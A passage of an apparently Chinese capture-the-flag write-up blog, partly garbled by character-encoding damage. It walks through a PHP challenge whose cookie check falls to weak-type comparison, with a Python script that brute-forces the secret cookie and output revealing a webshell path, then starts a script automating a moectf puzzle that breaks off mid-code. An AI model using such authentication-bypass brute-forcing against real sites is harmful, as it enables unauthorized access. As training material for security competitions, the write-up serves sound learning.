class="comment">//è¿”å› $_i çš„ ASCIIå€¼ï¼š</span></span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$_i</span> &amp; <span class="number">0xC0</span>);  <span class="comment">// æŒ‰ä½ä¸è¿ç®—11000000   æ•°å­—éƒ½ä¼šå˜æˆ1è¾“å‡ºï¼Œè€Œå­—æ¯éƒ½ä¼šå˜æˆ0è¾“å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰æŒ‰ä½ä¸è¿ç®—çš„è¯ï¼Œå¯ä»¥æŠŠè¾“å‡ºçš„ASCIIå€¼è¿”å›æˆå­—ç¬¦ä¸²å†md5è§£å¯†ä¸€ä¸‹</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]) ? <span class="variable">$json</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>] : <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">7200</span> );</span><br><span class="line"><span class="title function_ invoke__">checkCookie</span>(<span class="variable">$json</span>) ? <span class="variable">$obj</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"><span class="comment">// åˆ¤æ–­æœ‰æ— secret </span></span><br><span class="line"><span class="comment">// é€šè¿‡secretèµ‹å€¼ç»™$jsonï¼Œå†é€šè¿‡$jsonå»ºç«‹$obj</span></span><br><span class="line"><span class="comment">// json_decode() å°†jsonæ ¼å¼çš„æ•°æ®è½¬æ¢ä¸ºå¯¹è±¡ï¼Œæ•°ç»„ï¼Œè½¬æ¢ä¸ºæ•°ç»„è¦åŠ true</span></span><br><span class="line"><span class="comment">// jsonçš„secretéœ€è¦æ»¡è¶³ checkCookie($s) é‡Œé¢çš„æ¡ä»¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123;</span><br><span class="line">    (<span class="variable">$obj</span>[<span class="string">&#x27;secret&#x27;</span>] != <span class="variable">$flag_md5</span> ) ? <span class="title function_ invoke__">haveFun</span>(<span class="variable">$flag</span>) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*è¦è®©ä¼ å…¥çš„secretä¸º $flag_md5ï¼Œè¿™é‡Œå°±å­˜åœ¨æ¼æ´äº†ï¼Œåˆ©ç”¨phpçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œä½†æ˜¯è¿™é‡Œåˆæœ‰ä¸ªé—®é¢˜ï¼Œåœ¨json_decode()è¿”å›&quot;&quot;é‡Œé¢çš„å†…</span></span><br><span class="line"><span class="comment">å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå°±ä¸èƒ½è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒäº†ï¼Œä½†æ˜¯å¦‚æœé‡Œé¢çš„å†…å®¹ï¼Œæ¯”å¦‚æ•°å­—ï¼Œæ²¡æœ‰è¢«&quot;&quot;æ‹¬èµ·æ¥ï¼Œè¿”å›çš„å°±æ˜¯ä¸ªintæ•´æ•°ï¼Œæ‰€ä»¥æ³¨æ„æŠŠ&quot;&quot;åˆ å»ï¼Œä¹Ÿ</span></span><br><span class="line"><span class="comment">å°±æ˜¯&#123;&quot;secret&quot;:123&#125;ï¼Œè¿™é‡Œå¼€å§‹æ²¡æ³¨æ„åˆ°è¿˜è¢«å‘äº†ï¼Œä¸€ç›´æ²¡æœ‰çˆ†ç ´å‡ºæ¥</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">url = <span class="string">&#x27;http://ea50473b-4923-4d2b-b3a8-7a54a9a40e5f.challenge.ctf.show/?give_me_shell=&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1000</span>)):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>: <span class="string">f&#x27;secret=&#123;&#123;&quot;secret&quot;: <span class="subst">&#123;i&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,headers = headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;here is your webshell&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(headers)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240817221038792.png" alt="image-20240817221038792"></p>
<p>å¾—åˆ°webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">D:\python3.<span class="number">7</span>\python.exe C:\Users\<span class="number">31702</span>\Desktop\<span class="number">123</span>.py </span><br><span class="line"> <span class="number">12</span>%|â–ˆâ–        | <span class="number">115</span>/<span class="number">1000</span> [<span class="number">00</span>:<span class="number">02</span>&lt;<span class="number">00</span>:<span class="number">20</span>, <span class="number">42.35</span>it/s]</span><br><span class="line">&#123;<span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;secret=&#123;&quot;secret&quot;: 115&#125;&#x27;</span>&#125;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;<span class="keyword">real</span> easy checkin&lt;/title&gt;</span><br><span class="line">    &lt;link  href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&amp;display=swap&quot;</span>  rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            font-family: <span class="string">&quot;Inconsolata&quot;</span>, monospace;</span><br><span class="line">            text-align: center;</span><br><span class="line">            font-size: <span class="number">64</span>px;</span><br><span class="line">            vertical-align: middle;</span><br><span class="line">            user-select: none;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .flexmagic &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: <span class="number">90</span>%;</span><br><span class="line">            position: absolute;</span><br><span class="line"></span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">        &#125;</span><br><span class="line">         *&#123;margin:<span class="number">0</span>px; padding:<span class="number">0</span>px;&#125;</span><br><span class="line">        .botCenter&#123;width:<span class="number">100</span>%; height:<span class="number">35</span>px; line-height:<span class="number">35</span>px; background:<span class="comment">#ffffff; position:fixed; bottom:0px; left:0px; font-size:14px; color:#000; text-align:center;&#125;</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;https://gem-love.com/&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">botCenter</span>&quot;&gt;@é¢–å¥‡<span class="title">L</span>&#x27;<span class="title">Amore</span>&lt;/<span class="title">div</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">href</span>=&#x27;./?<span class="title">view_source</span>&#x27; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;&lt;<span class="title">button</span> <span class="title">hidden</span>&gt;&lt;/<span class="title">button</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flexmagic</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">id</span>=&quot;<span class="title">magic</span>&quot;&gt;<span class="title">I</span> <span class="title">prepared</span> <span class="title">a</span> <span class="title">webshell</span> <span class="title">for</span> <span class="title">you</span>&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">here</span> <span class="title">is</span> <span class="title">your</span> <span class="title">webshell</span>: <span class="title">w3b5HeLLlll123</span>.<span class="title">php</span>        &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> /<span class="title">flag</span>.<span class="title">txt</span>--&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">è¿›ç¨‹å·²ç»“æŸï¼Œé€€å‡ºä»£ç ä¸º 0</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<h2 id="moectfå‹‡é—¯é“œäººé˜µ-1"><a href="#moectfå‹‡é—¯é“œäººé˜µ-1" class="headerlink" title="moectfå‹‡é—¯é“œäººé˜µ"></a>moectfå‹‡é—¯é“œäººé˜µ</h2><p>ç®—æœ¯é¢˜</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://127.0.0.1:64459/&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">directions_map = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;å—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">combinations_map = &#123;</span><br><span class="line">    <span class="string">&#x27;1, 2&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;2, 1&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 3&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;3, 1&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 4&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;4, 1&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 5&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 1&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 6&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 1&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 7&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 1&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 8&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 1&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 3&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;3, 2&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 4&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;4, 2&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 5&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 2&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 6&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 2&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 7&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 2&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 8&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 2&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 4&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;4, 3&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 5&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 3&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 6&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 3&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 7&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 3&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 8&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 3&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 5&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 4&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 6&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 4&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 7&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 4&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 8&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 4&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5, 6&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 5&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5, 7&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 5&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5, 8&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 5&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6, 7&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 6&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6, 8&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 6&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7, 8&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 7&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_direction</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;,&#x27;</span> <span class="keyword">in</span> numbers:</span><br><span class="line">        <span class="keyword">return</span> combinations_map.get(numbers, <span class="string">&#x27;æœªçŸ¥ç»„åˆ&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> directions_map.get(numbers, <span class="string">&#x27;æœªçŸ¥æ–¹ä½&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">start_data = &#123;</span><br><span class="line">    <span class="string">&#x27;player&#x27;</span>: <span class="string">&#x27;zxy&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;direct&#x27;</span>: <span class="string">&#x27;å¼Ÿå­æ˜ç™½&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = session.post(base_url, headers=headers, data=start_data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    numbers = soup.find(<span class="string">&#x27;h1&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;status&#x27;</span>).text.strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ¥æ”¶åˆ°çš„æ•°å­—ç»„åˆ: <span class="subst">&#123;numbers&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¡ç®—æ–¹ä½</span></span><br><span class="line">    direction = get_direction(numbers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è®¡ç®—å‡ºçš„æ–¹ä½: <span class="subst">&#123;direction&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æäº¤æ–¹ä½</span></span><br><span class="line">    answer_data = &#123;</span><br><span class="line">        <span class="string">&#x27;player&#x27;</span>: <span class="string">&#x27;zxy&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;direct&#x27;</span>: direction</span><br><span 